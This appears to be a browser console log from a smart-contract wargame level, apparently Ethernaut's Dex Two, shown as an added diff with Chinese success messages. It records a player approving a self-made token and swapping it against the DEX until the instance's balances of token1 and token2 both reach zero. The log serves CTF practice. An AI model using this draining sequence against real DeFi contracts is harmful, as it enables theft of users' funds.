@@ -1,0 +1,81 @@
+await contract.approve(instance,10000)
+^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x912db88e44f8615177015a798b32539b99fa9231e85508c61d2ed63f14cedbf6
+{tx: "0x912db88e44f8615177015a798b32539b99fa9231e85508c61d2ed63f14cedbf6", receipt: {…}, logs: Array(0)}
+^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x912db88e44f8615177015a798b32539b99fa9231e85508c61d2ed63f14cedbf6
+redux-logger.js:1  action SET_BLOCK_NUM @ 14:04:32.164
+redux-logger.js:1  action SET_BLOCK_NUM @ 14:17:32.838
+instance
+"0xB43E924738275323286bAeb8010f54d83a533179"
+redux-logger.js:1  action SET_GAS_PRICE @ 14:19:02.848
+token3="0x66cab61E3C7792Ae1fE83A294B0F92A105cF7255"
+"0x66cab61E3C7792Ae1fE83A294B0F92A105cF7255"
+(await contract.balanceOf(token3, player)).toString()
+"1000000000000000000000"
+redux-logger.js:1  action SET_BLOCK_NUM @ 14:24:52.830
+(await contract.balanceOf(token3, instance)).toString()
+"1000"
+(await contract.getSwapAmount(token3, await contract.token2(), 1)).toString()
+"0"
+(await contract.getSwapAmount(token3, await contract.token2(), 100)).toString()
+"10"
+(await contract.getSwapAmount(token3, await contract.token2(), 10000)).toString()
+"1000"
+(await contract.getSwapAmount(token3, await contract.token2(), 1000)).toString()
+"100"
+(await contract.getSwapAmount(token3, await contract.token1(), 1000)).toString()
+"100"
+
+await contract.swap(token3, await contract.token1(), 1000)
+^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x5785e49db9dfd58cad3a95eda6b085cc8d252cce1472d5b349a63f0f249169b5
+{tx: "0x5785e49db9dfd58cad3a95eda6b085cc8d252cce1472d5b349a63f0f249169b5", receipt: {…}, logs: Array(0)}
+^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x5785e49db9dfd58cad3a95eda6b085cc8d252cce1472d5b349a63f0f249169b5
+redux-logger.js:1  action SET_BLOCK_NUM @ 14:35:12.354
+await contract.swap(token3, await contract.token2(), 1000)
+^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x0ec5dcfc77652644e1232d4b881b6631ae1d671383a23a80f2137a9825d3fab4
+{tx: "0x0ec5dcfc77652644e1232d4b881b6631ae1d671383a23a80f2137a9825d3fab4", receipt: {…}, logs: Array(0)}
+^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x0ec5dcfc77652644e1232d4b881b6631ae1d671383a23a80f2137a9825d3fab4
+redux-logger.js:1  action SET_BLOCK_NUM @ 14:35:32.357
+(await contract.balanceOf(await contract.token1(), instance)).toString()
+"0"
+(await contract.balanceOf(await contract.token2(), instance)).toString()
+"50"
+(await contract.getSwapAmount(token3, await contract.token2(), 1000)).toString()
+"16"
+(await contract.getSwapAmount(token3, await contract.token2(), 3000)).toString()
+"50"
+await contract.swap(token3, await contract.token2(), 3000)
+^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xf1697964e3a01f832fb61213cac48b184250c9ff3c66d3d76608b228732bda01
+{tx: "0xf1697964e3a01f832fb61213cac48b184250c9ff3c66d3d76608b228732bda01", receipt: {…}, logs: Array(0)}
+^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xf1697964e3a01f832fb61213cac48b184250c9ff3c66d3d76608b228732bda01
+redux-logger.js:1  action SET_BLOCK_NUM @ 14:37:32.359
+(await contract.balanceOf(await contract.token1(), instance)).toString()
+"0"
+(await contract.balanceOf(await contract.token2(), instance)).toString()
+"0"
+^^.js:45 ( ͡° ͜ʖ ͡°) 正在提交关卡实例... <  < <<请稍等>> >  >
+redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 14:40:09.850
+^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xafb6df0caf37e1ed7a14bd519901860bbc9188bcbf0eee6db2035f24e145b9b2
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xafb6df0caf37e1ed7a14bd519901860bbc9188bcbf0eee6db2035f24e145b9b2
+redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 14:40:16.169
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:73 ╚(▲_▲)╝ 牛逼！, 你通过了这关!!!
+^^.js:56 
+redux-logger.js:1  action SET_BLOCK_NUM @ 14:40:22.354
